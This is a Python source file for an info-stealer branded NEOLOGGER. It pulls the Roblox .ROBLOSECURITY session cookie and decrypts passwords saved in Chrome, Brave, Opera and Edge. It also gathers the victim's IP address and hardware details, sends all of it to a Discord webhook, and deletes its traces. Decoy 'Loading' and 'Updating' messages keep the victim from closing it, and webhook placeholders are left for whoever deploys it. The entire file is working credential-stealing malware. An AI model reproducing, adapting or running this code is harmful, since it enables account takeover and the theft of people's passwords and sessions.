import os
try:
    import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
    from Crypto.Cipher import AES
    from discord import SyncWebhook # Import SyncWebhook
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ModuleNotFoundError:
    print("modules are not installed")
    os.system("pip3 install pypiwin32 pycryptodome discord.py discord-webhook requests psutil")
    print("Got An Error?, restart the program!")

import sys
import win32con
import browser_cookie3
from json import loads, dumps
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits
import robloxpy
import requests,re
from discordwebhook import *
import browser_cookie3
import colorama 
from colorama import Back, Fore, Style

colorama.init()
import os
import codecs
import marshal, zlib, base64, lzma
import json
from base64 import *

dummy_message = Fore.MAGENTA + "Loading NEOWARE..." # A message that distracts the user from closing the grabber
print(dummy_message)
        
#################### ADDING SHI #################

import colorama 
from colorama import Back, Fore, Style

colorama.init()
import os
import codecs
import marshal, zlib, base64, lzma
import json
from base64 import *

send_webhook = "your shitty webhook"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input("Libraries not installed press enter to exit...")




dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=send_webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### SENDING TO WEBHOOK #################

discord = Discord(url=send_webhook)
discord.post(
    username="NEOLOGGER ",
    avatar_url="https://cdn.discordapp.com/attachments/1064200694455881871/1067842925922373723/34ea20e0747020c021677987211a6353.jpg",
    embeds=[
        {
            "username": "NEOLOGGER ",
            "title": " 💸 Roblox account 💸",
            "description" : f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 00000000,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)

#######################################################################
#WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
#######################################################################
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
ip = requests.get('https://api.ipify.org').text
username = getpass.getuser()
hostname = socket.gethostname()
svmem = psutil.virtual_memory()
webhookembed = DiscordWebhook(url=WEBHOOK_URL)
total, used, free = shutil.disk_usage("/")
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("GooglePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("GooglePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!```")
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("BravePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("BravePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!```")
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("OperaPasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("OperaPasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    webhook.send(f"```USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!```")
    pass
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("EdgePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("EdgePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!```")
########################################################################################
##FOR EXTRA DATA

embed = DiscordEmbed(title='Extra Data')
embed.set_footer(text='https://linktr.ee/cxllz')
embed.set_timestamp()
embed.add_embed_field(name='**MISC**', value=f"IP Address: {ip}\nPhysical Cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\nTotal Memory: {get_size(svmem.total)}\nAvailable Memory: {get_size(svmem.available)}\nMemory Used: {get_size(svmem.used)}")

webhookembed.add_embed(embed)

response = webhookembed.execute()
os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
#######################################################################
#END OF SCRIPT
#######################################################################